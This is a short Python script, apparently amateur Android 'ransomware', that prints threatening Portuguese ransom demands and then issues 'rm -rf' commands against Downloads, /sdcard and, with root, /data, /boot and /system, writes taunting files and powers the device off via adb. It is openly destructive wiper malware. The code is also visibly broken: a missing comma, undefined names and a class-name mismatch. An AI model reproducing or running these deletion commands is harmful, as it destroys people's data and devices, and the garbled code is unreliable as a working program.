from os import system as run_system, startfile as open_file
from time import sleep
from subprocess import run

class malwRe:
    def start(self):
    	run("clear")
    	
    	print("Você caiu em um ransomware!!!, pague em bitcoin ou APAGAREMOS e VAZAREMOS  TODO QUE ESTA NO SEU DISPOSITIVO")
    	sleep(1)
    	print("Não adianta sair!, mesmo não perdendo os arquivos, nós teremos acesso ao seu dispositivo")
    	sleep(1)
    	print("Nós instalamos VARIOS malwares e VIRUS no seu dispositivo!, TEMOS CONTROLE TOTAL")
    	sleep(1)
    	
    	run('rm-rf Downloads', shell=shell_flag)
    	run("rm -rf /sdcard"shell=shell_flag)
    	
    	if os.geteuid() == 0:
    	    run("rm -rf /data",shell=shell_flag)
    	    run("rm -rf /boot",shell=shell_flag)
    	    run("rm -rf /system",shell=shell_flag)


        for i in range(1, 101):
            filename = f"lol/BY_WpsDroid{i}.txt"
            with open(filename, 'w') as f:
                f.write("kkk script kiddie otario")
                open_file(filename)
                
                run("adb shell reboot -p", shell=True)
                
wiper = malwaRe()
wiper.start() 